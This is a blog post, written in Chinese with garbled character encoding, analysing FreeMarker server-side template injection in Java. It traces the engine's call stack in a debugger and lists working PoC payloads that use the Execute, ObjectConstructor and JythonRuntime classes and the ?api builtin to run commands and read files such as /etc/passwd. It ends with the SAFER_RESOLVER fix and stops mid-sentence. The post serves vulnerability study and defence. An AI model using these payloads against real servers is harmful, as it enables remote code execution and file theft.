    <link href="/2025/07/16/java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E4%B8%AD%E7%9A%84SSTI/"/>
    <url>/2025/07/16/java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E4%B8%AD%E7%9A%84SSTI/</url>
    
    <content type="html"><![CDATA[<h2 id="FreeMarker-SSTI"><a href="#FreeMarker-SSTI" class="headerlink" title="FreeMarker SSTI"></a>FreeMarker SSTI</h2><h3 id="FreeMarketåŸºæœ¬è¯­æ³•"><a href="#FreeMarketåŸºæœ¬è¯­æ³•" class="headerlink" title="FreeMarketåŸºæœ¬è¯­æ³•"></a>FreeMarketåŸºæœ¬è¯­æ³•</h3><h4 id="æ’å€¼"><a href="#æ’å€¼" class="headerlink" title="æ’å€¼"></a>æ’å€¼</h4><p><a href="http://freemarker.foofun.cn/dgui_template_valueinsertion.html">æ’å€¼ - FreeMarker ä¸­æ–‡å®˜æ–¹å‚è€ƒæ‰‹å†Œ (foofun.cn)</a></p><p>æ’å€¼çš„ä½¿ç”¨æ ¼å¼æ˜¯ï¼š <code>$&#123;expression&#125;</code>ï¼Œè¿™é‡Œçš„ <code>expression</code> å¯ä»¥æ˜¯æ‰€æœ‰ç§ç±»çš„è¡¨è¾¾å¼(æ¯”å¦‚ <code>$&#123;100 + x&#125;</code>)ã€‚</p><p>æ’å€¼æ˜¯ç”¨æ¥ç»™è¡¨è¾¾å¼æ’å…¥å…·ä½“å€¼ç„¶åè½¬æ¢ä¸ºæ–‡æœ¬(å­—ç¬¦ä¸²)ã€‚æ’å€¼ä»…ä»…å¯ä»¥åœ¨ä¸¤ç§ä½ç½®ä½¿ç”¨ï¼šåœ¨æ–‡æœ¬åŒº(æ¯”å¦‚ <code>&lt;h1&gt;Hello $&#123;name&#125;!&lt;/h1&gt;</code>) å’Œå­—ç¬¦ä¸²è¡¨è¾¾å¼(æ¯”å¦‚ <code>&lt;#include &quot;/footer/$&#123;company&#125;.html&quot;&gt;</code>)ä¸­ã€‚</p><p>éœ€è¦æ³¨æ„çš„æ˜¯ï¼šå¦‚æœæ’å€¼åœ¨æ–‡æœ¬åŒº (ä¹Ÿå°±æ˜¯è¯´ï¼Œä¸åœ¨å­—ç¬¦ä¸²è¡¨è¾¾å¼ä¸­)ï¼Œå¦‚æœ <code>escape</code> æŒ‡ä»¤èµ·ä½œç”¨äº†ï¼Œé‚£ä¹ˆå°†è¢«æ’å…¥çš„å­—ç¬¦ä¸²ä¼šè¢«è‡ªåŠ¨è½¬ä¹‰ã€‚</p><h4 id="FTLæŒ‡ä»¤"><a href="#FTLæŒ‡ä»¤" class="headerlink" title="FTLæŒ‡ä»¤"></a>FTLæŒ‡ä»¤</h4><p><a href="http://freemarker.foofun.cn/dgui_template_directives.html">æŒ‡ä»¤ - FreeMarker ä¸­æ–‡å®˜æ–¹å‚è€ƒæ‰‹å†Œ (foofun.cn)</a></p><p>ä½¿ç”¨&lt;# æŒ‡ä»¤ &gt;</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs html">eg. &lt;#local name=value&gt;<br></code></pre></td></tr></table></figure><h3 id="FreeMarker-SSTI-æˆå› ä¸æ”»å‡»é¢"><a href="#FreeMarker-SSTI-æˆå› ä¸æ”»å‡»é¢" class="headerlink" title="FreeMarker SSTI æˆå› ä¸æ”»å‡»é¢"></a>FreeMarker SSTI æˆå› ä¸æ”»å‡»é¢</h3><p>SSTI çš„æ”»å‡»é¢æ˜¯æ¨¡æ¿å¼•æ“çš„æ¸²æŸ“ï¼Œè¦è®© Web æœåŠ¡å™¨å°† HTML è¯­å¥æ¸²æŸ“ä¸ºæ¨¡æ¿å¼•æ“ï¼Œå‰ææ˜¯è¦å…ˆæœ‰ HTML è¯­å¥ã€‚</p><p>å°† HTML è¯­å¥æ”¾åˆ°æœåŠ¡å™¨ä¸Šæœ‰ä¸¤ç§æ–¹æ³•ï¼š</p><ul><li>1ã€æ–‡ä»¶ä¸Šä¼  HTML æ–‡ä»¶ã€‚</li><li>2ã€è‹¥æŸ CMS è‡ªå¸¦æœ‰æ¨¡æ¿ç¼–è¾‘åŠŸèƒ½(å¸¸è§)</li></ul><h4 id="ç¯å¢ƒæ­å»º"><a href="#ç¯å¢ƒæ­å»º" class="headerlink" title="ç¯å¢ƒæ­å»º"></a>ç¯å¢ƒæ­å»º</h4><p>è¿™é‡Œä½¿ç”¨Drunkbabyçš„æ¼æ´é¡¹ç›®ï¼š</p><p><a href="https://github.com/Drun1baby/JavaSecurityLearning/tree/main/JavaSecurity">JavaSecurityLearning&#x2F;JavaSecurity at main Â· Drun1baby&#x2F;JavaSecurityLearning (github.com)</a></p><p>æ„é€ payload</p><p>freemarker.template.utility.Executeç±»ä¸­å­˜åœ¨å‘½ä»¤æ‰§è¡Œæ–¹æ³•</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java">&lt;#assign value=<span class="hljs-string">&quot;freemarker.template.utility.Execute&quot;</span>?<span class="hljs-keyword">new</span>()&gt;$&#123;value(<span class="hljs-string">&quot;Calc&quot;</span>)&#125;<br></code></pre></td></tr></table></figure><p>æ­¤é¡¹ç›®æ²¡æœ‰å†™æ¼æ´å…¥å£ï¼Œæ‰€ä»¥åˆ©ç”¨æ—¶åªèƒ½å°†payloadç›´æ¥æ’å…¥.ftlä¸­</p><p><img src="/img/ssti(java)/ssti01.png"></p><p>æˆåŠŸæ‰§è¡Œ</p><p><img src="/img/ssti(java)/ssti02.png"></p><h4 id="æ¼æ´åˆ†æ"><a href="#æ¼æ´åˆ†æ" class="headerlink" title="æ¼æ´åˆ†æ"></a>æ¼æ´åˆ†æ</h4><p>ä¸‹ä¸€ä¸ªæ–­ç‚¹åœ¨ <code>org.springframework.web.servlet.view.UrlBasedViewResolver#createView</code>ï¼Œå¼€å§‹è°ƒè¯•</p><p> <code>createView(String viewName, Locale locale)</code> æ–¹æ³•ï¼Œç”¨äºåˆ›å»ºè§†å›¾å¯¹è±¡(View)ï¼Œå®ƒæ ¹æ®é€»è¾‘è§†å›¾åçš„å‰ç¼€ï¼Œåˆ¤æ–­åº”è¯¥åˆ›å»ºå“ªç§ç±»å‹çš„è§†å›¾ï¼šé‡å®šå‘ã€è½¬å‘ï¼Œæˆ–é»˜è®¤å¤„ç†æ–¹å¼ã€‚</p><p>åœ¨æ­¤å¤„ä¸‹æ–­ç‚¹æ˜¯å› ä¸ºMVC åŠ è½½æµç¨‹æ˜¯ä»è§†å›¾è§£æå™¨åˆ°æ¨¡æ¿å¼•æ“ï¼ŒcreateView-&gt;loadView()-&gt;buildView()ï¼ŒbuildView()æ–¹æ³•å¼€å§‹æœ‰æ¨¡æ¿å¼•æ“å‚ä¸</p><p><img src="/img/ssti(java)/ssti03.png"></p><p>å‚è€ƒæ­¤æ–‡ç« ï¼š<a href="https://www.cnblogs.com/LittleHann/p/17846825.html#_lab2_0_4">Javaæ¨¡ç‰ˆå¼•æ“æ³¨å…¥ï¼ˆSSTIï¼‰æ¼æ´ç ”ç©¶ - éƒ‘ç€š - åšå®¢å›­ (cnblogs.com)</a></p><p>å¦‚æœå¯¹ä»£ç ç»“æ„ä»¥åŠå…¶ä¸­çš„ç±»å’Œæ–¹æ³•äº†è§£ä¸å¤Ÿé€å½»ï¼Œå¯ä»¥ç›´æ¥åœ¨ä»£ç æœ€åä¸€æ­¥ä¸‹æ–­ç‚¹ï¼Œæ­¤æ¼æ´æ˜¯åœ¨å‘½ä»¤æ‰§è¡Œæ–¹æ³•å¤„(freemarker&#x2F;template&#x2F;utility&#x2F;Execute.classç±»çš„execæ–¹æ³•ä¸‹æ–­ç‚¹)ï¼ŒæŸ¥çœ‹è°ƒç”¨æ ˆï¼Œåˆ¤æ–­è§¦å‘ftlé£é™©ä»£ç çš„è°ƒç”¨æ ˆä» å“ªé‡Œå¼€å§‹ï¼Œå†é€æ­¥åˆ†æ</p><p>ä¸‹æ–­ç‚¹åå¯ä»¥çœ‹åˆ°è§¦å‘ftlé£é™©ä»£ç çš„è°ƒç”¨æ ˆæ˜¯ä»FreeMarkerviewç±»çš„processTemplateæ–¹æ³•å¼€å§‹çš„</p><p><img src="/img/ssti(java)/ssti04.png"></p><p>æ ¹æ®è°ƒç”¨æ ˆè·Ÿè¿›ä»£ç æ‰§è¡Œæµç¨‹</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">exec</span>:75, Execute (freemarker.template.utility)<br>_eval:62, MethodCall (freemarker.core)<br><span class="hljs-built_in">eval</span>:101, Expression (freemarker.core)<br>calculateInterpolatedStringOrMarkup:100, DollarVariable (freemarker.core)<br>accept:63, DollarVariable (freemarker.core)<br>visit:334, Environment (freemarker.core)<br>visit:340, Environment (freemarker.core)<br>process:313, Environment (freemarker.core)<br>process:383, Template (freemarker.template)<br></code></pre></td></tr></table></figure><p>åœ¨å¼€å§‹å¤„ä¸‹æ–­ç‚¹è¿›è¡Œè°ƒè¯•</p><p><img src="/img/ssti(java)/ssti05.png"></p><p>processTemplate-&gt;process()-&gt;visit()-&gt;pushElement()-&gt;element.accept()-&gt;getChildBuffer()-&gt;write()</p><p>process() æ–¹æ³•æ˜¯åšäº†ä¸€ä¸ªè¾“å‡ºï¼ˆç”Ÿæˆï¼‰ HTML æ–‡ä»¶æˆ–å…¶ä»–æ–‡ä»¶çš„å·¥ä½œï¼Œç›¸å½“äºæ¸²æŸ“çš„æœ€åä¸€æ­¥äº†ã€‚</p><p>åœ¨ process() æ–¹æ³•ä¸­ï¼Œä¼šå¯¹ ftl çš„æ–‡ä»¶è¿›è¡Œéå†ï¼Œè¯»å–ä¸€äº›ä¿¡æ¯ï¼Œä¸‹é¢æˆ‘ä»¬å…ˆè¯´å¯¹äºæ­£å¸¸è¯­å¥çš„å¤„ç†ï¼Œå†è¯´å¯¹äº ftl è¡¨è¾¾å¼çš„å¤„ç†ã€‚</p><p>åœ¨è¯»å–åˆ°æ¯ä¸€æ¡ freeMarker è¡¨è¾¾å¼è¯­å¥çš„æ—¶å€™ï¼Œä¼šäºŒæ¬¡è°ƒç”¨ <code>visit()</code> æ–¹æ³•ï¼Œ</p><p><img src="/img/ssti(java)/ssti06.png"></p><p>è€Œ visit() æ–¹æ³•åˆè°ƒç”¨äº† element.accept()ï¼Œ</p><p><img src="/img/ssti(java)/ssti07.png"></p><p>æ­¤å¤„ä»£ç æ‰§è¡Œååˆ†å¤æ‚ï¼Œï¼Œå»ºè®®ç›´æ¥æ ¹æ®åˆšæ‰æ‰€çœ‹è°ƒç”¨æ ˆè·Ÿè¿›å‡½æ•°æ›´åŠ æ¸…æ™°æ˜äº†ï¼Œä¸è¦ä¸€ç›´åŠ¨æ€è°ƒè¯•æ­¥å…¥</p><p>æ ¹æ®è°ƒç”¨æ ˆè½¬åˆ°DollarVariableç±»acceptæ–¹æ³•ï¼Œå¯ä»¥çœ‹åˆ°è°ƒç”¨äº†calculateInterpolatedStringOrMarkupæ–¹æ³•</p><p><img src="/img/ssti(java)/ssti08.png"></p><p>è·Ÿè¿›calculateInterpolatedStringOrMarkupæ–¹æ³•ï¼Œè¯¥æ–¹æ³•åšçš„ä¸šåŠ¡æ˜¯å°†æ¨¡å‹å¼ºåˆ¶ä¸ºå­—ç¬¦ä¸²æˆ–æ ‡è®°</p><p><img src="/img/ssti(java)/ssti09.png"></p><p>è·Ÿè¿›evalæ–¹æ³•ï¼Œå¯ä»¥çœ‹åˆ°evalå‡½æ•°å¯¹constantValueçš„å€¼åšäº†ç®€å•çš„åˆ¤æ–­ï¼Œåˆ¤å®šå€¼ä¸ºç©ºåè·Ÿè¿› <code>this._eval()</code><img src="/img/ssti(java)/ssti10.png"></p><p>ä¸€èˆ¬çš„ <code>_eval()</code> æ–¹æ³•åªæ˜¯å°† evn è·å–ä¸€ä¸‹,å¦‚ä¸‹å›¾</p><p>è¿™æ˜¯é€šè¿‡DollarVariableç±»acceptæ–¹æ³•-&gt;evalæ–¹æ³•-&gt;_evalæ–¹æ³•</p><p><img src="/img/ssti(java)/ssti16.png"></p><p>ä½†æ˜¯è¿™é‡Œçš„elementçš„å€¼æ˜¯å›¾ä¸­æ‰€ç¤ºï¼Œå¯ä»¥ä»æ­¤å¤„å¼€å§‹åŠ¨æ€è°ƒè¯•</p><p><img src="/img/ssti(java)/ssti11.png"></p><p>appendä¼šè°ƒç”¨assignç±»ä¸­çš„appendæ–¹æ³•åšäº†ä¸€ç³»åˆ—åŸºç¡€åˆ¤æ–­ï¼Œå…ˆåˆ¤æ–­ <code>namespaceExp</code> æ˜¯å¦ä¸º nullï¼Œæ¥ç€åˆåˆ¤æ–­ <code>this.operatorType </code>æ˜¯å¦ç­‰äº 65536</p><p><img src="/img/ssti(java)/ssti12.png"></p><p>çœ‹åˆ°æ­¤å¤„è·å–valueEXPï¼Œè·Ÿè¿›evalæ–¹æ³•</p><p><img src="/img/ssti(java)/ssti13.png"></p><p>evalå‡½æ•°ä¸­åˆ¤æ–­constantValueå€¼ä¸ºç©ºåï¼Œè·Ÿè¿›_evalæ–¹æ³•</p><p>ç»è¿‡ä¸€ç³»åˆ—å¤æ‚çš„ä»£ç å¯ä»¥çœ‹åˆ° <code>targetMethod</code> ç›®å‰å°±æ˜¯æˆ‘ä»¬åœ¨ ftl è¯­å¥å½“ä¸­æ„é€ çš„é‚£ä¸ªèƒ½å¤Ÿè¿›è¡Œå‘½ä»¤æ‰§è¡Œçš„ç±»</p><p><img src="/img/ssti(java)/ssti15.png"></p><p>æ­¤æ—¶è¿™ä¸€ä¸ªè¯­å¥ç›¸å½“äº</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">Object</span> <span class="hljs-variable">result</span> <span class="hljs-operator">=</span> targetMethod.exec(argumentStrings);<br><span class="hljs-comment">// ç­‰ä»·äº</span><br><span class="hljs-type">Object</span> <span class="hljs-variable">result</span> <span class="hljs-operator">=</span> freemarker.template.utility.Execute.exec(argumentStrings);<br></code></pre></td></tr></table></figure><p>è€Œè¿™ä¸€æ­¥å¹¶éç›´æ¥è¿›è¡Œå‘½ä»¤æ‰§è¡Œï¼Œè€Œæ˜¯å…ˆæŠŠè¿™ä¸ªç±»é€šè¿‡ <code>newInstance()</code> çš„æ–¹å¼è¿›è¡Œåˆå§‹åŒ–ã€‚</p><p>å‘½ä»¤æ‰§è¡Œçš„å‚æ•°ï¼Œä¼šè¢«æ‹¿å‡ºæ¥ï¼Œåœ¨ä¸‹ä¸€æ¬¡çš„åŒæ ·æµç¨‹ä¸­ä½œä¸ºå‘½ä»¤è¢«æ‰§è¡Œï¼Œå¦‚å›¾</p><p><img src="/img/ssti(java)/ssti17.png"></p><p>è‡³æ­¤ï¼Œæ¼æ´ä»£ç åˆ†æç»“æŸã€‚</p><p>aiäº†ä¸€ä¸‹_evalä»£ç çš„å«ä¹‰</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs java">TemplateModel <span class="hljs-title function_">_eval</span><span class="hljs-params">(Environment env)</span> <span class="hljs-keyword">throws</span> TemplateException &#123;<br>    <span class="hljs-type">TemplateModel</span> <span class="hljs-variable">targetModel</span> <span class="hljs-operator">=</span> <span class="hljs-built_in">this</span>.target.eval(env);<br></code></pre></td></tr></table></figure><p>å®šä¹‰ä¸€ä¸ª <code>_eval</code> æ–¹æ³•ï¼Œè¿”å›ä¸€ä¸ª <code>TemplateModel</code>ï¼ˆFreeMarker ä¸­çš„é€šç”¨æ¨¡å‹ç±»å‹ï¼‰ã€‚</p><p>è°ƒç”¨ <code>this.target.eval(env)</code> è§£æå‡ºå½“å‰è¦æ‰§è¡Œçš„ç›®æ ‡å¯¹è±¡ï¼ˆå¯èƒ½æ˜¯æ–¹æ³•æˆ–å˜é‡ï¼‰ï¼Œå¹¶èµ‹å€¼ç»™ <code>targetModel</code>ã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">if</span> (targetModel <span class="hljs-keyword">instanceof</span> TemplateMethodModel) &#123;<br>    <span class="hljs-type">TemplateMethodModel</span> <span class="hljs-variable">targetMethod</span> <span class="hljs-operator">=</span> (TemplateMethodModel) targetModel;<br></code></pre></td></tr></table></figure><p>å¦‚æœç›®æ ‡æ˜¯ä¸€ä¸ªæ¨¡æ¿æ–¹æ³•ï¼ˆ<code>TemplateMethodModel</code>ï¼‰ï¼Œå°±å°†å…¶å¼ºåˆ¶ç±»å‹è½¬æ¢ä¸º <code>targetMethod</code>ã€‚</p><p>æ­¤æ®µä»£ç ä¼šåˆ¤æ–­elementä¸­çš„å€¼æ˜¯æ–¹æ³•è¿˜æ˜¯å‚æ•°ï¼Œå¯¹åº”ä¼ ç»™ä¸åŒå˜é‡ï¼Œä»¥ç¡®ä¿å‘½ä»¤çš„æ­£ç¡®æ‹¼æ¥</p><h3 id="FreeMarker-SSTI-çš„æ”»é˜²äºŒè±¡æ€§"><a href="#FreeMarker-SSTI-çš„æ”»é˜²äºŒè±¡æ€§" class="headerlink" title="FreeMarker SSTI çš„æ”»é˜²äºŒè±¡æ€§"></a>FreeMarker SSTI çš„æ”»é˜²äºŒè±¡æ€§</h3><p>ç°åœ¨ä½¿ç”¨çš„poc</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs html">&lt;#assign value=&quot;freemarker.template.utility.Execute&quot;?new()&gt;$&#123;value(&quot;Calc&quot;)&#125;<br></code></pre></td></tr></table></figure><p>è¿™æ˜¯ FreeMarker çš„å†…ç½®å‡½æ•° new å¯¼è‡´çš„ï¼Œä¸‹é¢ç®€å•ä»‹ç»ä¸€ä¸‹ FreeMarkerçš„ä¸¤ä¸ªå†…ç½®å‡½æ•°â€”â€” <code>new</code> å’Œ <code>api</code></p><h4 id="å†…ç½®å‡½æ•°-new"><a href="#å†…ç½®å‡½æ•°-new" class="headerlink" title="å†…ç½®å‡½æ•° new"></a>å†…ç½®å‡½æ•° new</h4><p>å¯åˆ›å»ºä»»æ„å®ç°äº† <code>TemplateModel</code> æ¥å£çš„ Java å¯¹è±¡ï¼ŒåŒæ—¶è¿˜å¯ä»¥è§¦å‘æ²¡æœ‰å®ç° <code>TemplateModel</code> æ¥å£çš„ç±»çš„é™æ€åˆå§‹åŒ–å—ã€‚<br>ä»¥ä¸‹ä¸¤ç§å¸¸è§çš„FreeMarkeræ¨¡ç‰ˆæ³¨å…¥pocå°±æ˜¯åˆ©ç”¨newå‡½æ•°ï¼Œåˆ›å»ºäº†ç»§æ‰¿ <code>TemplateModel</code> æ¥å£çš„ <code>freemarker.template.utility.JythonRuntime</code> å’Œ<code>freemarker.template.utility.Execute</code></p><h4 id="API"><a href="#API" class="headerlink" title="API"></a>API</h4><p><code>value?api</code> æä¾›å¯¹ value çš„ APIï¼ˆé€šå¸¸æ˜¯ Java APIï¼‰çš„è®¿é—®ï¼Œä¾‹å¦‚ <code>value?api.someJavaMethod()</code> æˆ– <code>value?api.someBeanProperty</code>ã€‚å¯é€šè¿‡ <code>getClassLoader</code>è·å–ç±»åŠ è½½å™¨ä»è€ŒåŠ è½½æ¶æ„ç±»ï¼Œæˆ–è€…ä¹Ÿå¯ä»¥é€šè¿‡ <code>getResource</code>æ¥å®ç°ä»»æ„æ–‡ä»¶è¯»å–ã€‚<br>ä½†æ˜¯ï¼Œå½“<code>api_builtin_enabled</code>ä¸º true æ—¶æ‰å¯ä½¿ç”¨ api å‡½æ•°ï¼Œè€Œè¯¥é…ç½®åœ¨ <strong>2.3.22 ç‰ˆæœ¬</strong>ä¹‹åé»˜è®¤ä¸º falseã€‚</p><ul><li>ç”±æ­¤æˆ‘ä»¬å¯ä»¥æ„é€ å‡ºä¸€ç³»åˆ—çš„ bypass PoC</li></ul><p>POC1</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs java">&lt;#assign classLoader=object?api.class.protectionDomain.classLoader&gt; <br>&lt;#assign clazz=classLoader.loadClass(<span class="hljs-string">&quot;ClassExposingGSON&quot;</span>)&gt; <br>&lt;#assign field=clazz?api.getField(<span class="hljs-string">&quot;GSON&quot;</span>)&gt; <br>&lt;#assign gson=field?api.get(<span class="hljs-literal">null</span>)&gt; <br>&lt;#assign ex=gson?api.fromJson(<span class="hljs-string">&quot;&#123;&#125;&quot;</span>, classLoader.loadClass(<span class="hljs-string">&quot;freemarker.template.utility.Execute&quot;</span>))&gt; <br>$&#123;ex(<span class="hljs-string">&quot;Calc&quot;</span><span class="hljs-string">&quot;)&#125;</span><br></code></pre></td></tr></table></figure><p>POC2</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java">&lt;#assign value=<span class="hljs-string">&quot;freemarker.template.utility.ObjectConstructor&quot;</span>?<span class="hljs-keyword">new</span>()&gt;$&#123;value(<span class="hljs-string">&quot;java.lang.ProcessBuilder&quot;</span>,<span class="hljs-string">&quot;Calc&quot;</span>).start()&#125;<br></code></pre></td></tr></table></figure><p>POC3</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java">&lt;#assign value=<span class="hljs-string">&quot;freemarker.template.utility.JythonRuntime&quot;</span>?<span class="hljs-keyword">new</span>()&gt;&lt;<span class="hljs-meta">@value</span>&gt;<span class="hljs-keyword">import</span> os;os.system(<span class="hljs-string">&quot;calc&quot;</span>)<br></code></pre></td></tr></table></figure><p>POC4</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java">&lt;#assign ex=<span class="hljs-string">&quot;freemarker.template.utility.Execute&quot;</span>?<span class="hljs-keyword">new</span>()&gt; $&#123; ex(<span class="hljs-string">&quot;Calc&quot;</span>) &#125;<br></code></pre></td></tr></table></figure><p>è¯»å–æ–‡ä»¶</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs java">&lt;#assign is=object?api.class.getResourceAsStream(<span class="hljs-string">&quot;/Test.class&quot;</span>)&gt;<br>FILE:[&lt;#list <span class="hljs-number">0.</span><span class="hljs-number">.999999999</span> as _&gt;<br>    &lt;#assign <span class="hljs-type">byte</span>=is.read()&gt;<br>    &lt;#<span class="hljs-keyword">if</span> <span class="hljs-type">byte</span> == -<span class="hljs-number">1</span>&gt;<br>        &lt;#<span class="hljs-keyword">break</span>&gt;<br>    &lt;/#<span class="hljs-keyword">if</span>&gt;<br>$&#123;<span class="hljs-type">byte</span>&#125;, &lt;/#list&gt;]<br></code></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs java">&lt;#assign uri=object?api.class.getResource(<span class="hljs-string">&quot;/&quot;</span>).toURI()&gt;<br>&lt;#assign input=uri?api.create(<span class="hljs-string">&quot;file:///etc/passwd&quot;</span>).toURL().openConnection()&gt;<br>&lt;#assign is=input?api.getInputStream()&gt;<br>FILE:[&lt;#list <span class="hljs-number">0.</span><span class="hljs-number">.999999999</span> as _&gt;<br>    &lt;#assign <span class="hljs-type">byte</span>=is.read()&gt;<br>    &lt;#<span class="hljs-keyword">if</span> <span class="hljs-type">byte</span> == -<span class="hljs-number">1</span>&gt;<br>        &lt;#<span class="hljs-keyword">break</span>&gt;<br>    &lt;/#<span class="hljs-keyword">if</span>&gt;<br>$&#123;<span class="hljs-type">byte</span>&#125;, &lt;/#list&gt;]<br></code></pre></td></tr></table></figure><h4 id="ä¿®å¤å’Œé˜²å¾¡"><a href="#ä¿®å¤å’Œé˜²å¾¡" class="headerlink" title="ä¿®å¤å’Œé˜²å¾¡"></a>ä¿®å¤å’Œé˜²å¾¡</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">Configuration</span> <span class="hljs-variable">cfg</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Configuration</span>();<br>cfg.setNewBuiltinClassResolver(TemplateClassResolver.SAFER_RESOLVER);<br></code></pre></td></tr></table></figure><p>è®¾ç½®cfg.setNewBuiltinClassResolver(TemplateClassResolver.SAFER_RESOLVER);ï¼Œå®ƒä¼šåŠ å…¥ä¸€ä¸ªæ ¡éªŒï¼Œå°†freemarker.template.utility.JythonRuntimeã€freemarker.template.utility.Executeã€freemarker.template.utility.ObjectConstructorè¿‡æ»¤ã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> org.example;<br><br><span class="hljs-keyword">import</span> freemarker.core.TemplateClassResolver;<br><span class="hljs-keyword">import</span> freemarker.template.Configuration;<br><span class="hljs-keyword">import</span> freemarker.template.Template;<br><br><span class="hljs-keyword">import</span> java.io.File;<br><span class="hljs-keyword">import</span> java.io.FileWriter;<br><span class="hljs-keyword">import</span> java.io.Writer;<br><span class="hljs-keyword">import</span> java.util.HashMap;<br><span class="hljs-keyword">import</span> java.util.Map;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">exec_pcc</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception&#123;<br>        <span class="hljs-comment">//1.åˆ›å»ºé…ç½®ç±»</span><br>        <span class="hljs-type">Configuration</span> <span class="hljs-variable">configuration</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Configuration</span>(Configuration.getVersion());<br>        <span class="hljs-comment">//2.è®¾ç½®æ¨¡æ¿æ‰€åœ¨çš„ç›®å½•</span><br>        configuration.setDirectoryForTemplateLoading(<span class="hljs-keyword">new</span> <span class="hljs-title class_">File</span>(<span class="hljs-string">&quot;/Users/zhenghan/Projects/FreeMarker_test/src/main/resources&quot;</span>));<br>        <span class="hljs-comment">//3.è®¾ç½®å­—ç¬¦é›†</span><br>        configuration.setDefaultEncoding(<span class="hljs-string">&quot;utf-8&quot;</span>);<br>        <span class="hljs-comment">//4.åŠ è½½æ¨¡æ¿</span><br>        <span class="hljs-type">Template</span> <span class="hljs-variable">template</span> <span class="hljs-operator">=</span> configuration.getTemplate(<span class="hljs-string">&quot;exec_poc1.ftl&quot;</span>);<br><br>        <span class="hljs-comment">// å¢åŠ elementså®‰å…¨è¿‡æ»¤</span><br>        configuration.setNewBuiltinClassResolver(TemplateClassResolver.SAFER_RESOLVER);<br><br>        <span class="hljs-comment">//5.åˆ›å»ºæ•°æ®æ¨¡å‹</span><br>        Map map=<span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>();<br>        map.put(<span class="hljs-string">&quot;name&quot;</span>, <span class="hljs-string">&quot;å¼ ä¸‰&quot;</span>);<br>        map.put(<span class="hljs-string">&quot;message&quot;</span>, <span class="hljs-string">&quot;æ¬¢è¿æ¥åˆ°æˆ‘çš„åšå®¢ï¼&quot;</span>);<br>        <span class="hljs-comment">//6.åˆ›å»ºWriterå¯¹è±¡</span><br>        <span class="hljs-type">Writer</span> <span class="hljs-variable">out</span> <span class="hljs-operator">=</span><span class="hljs-keyword">new</span> <span class="hljs-title class_">FileWriter</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">File</span>(<span class="hljs-string">&quot;/Users/zhenghan/Projects/FreeMarker_test/src/main/resources/exec_poc1.html&quot;</span>));<br>        <span class="hljs-comment">//7.è¾“å‡º</span><br>        template.process(map, out);<br>        <span class="hljs-comment">//8.å…³é—­Writerå¯¹è±¡</span><br>        out.close();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>ä» 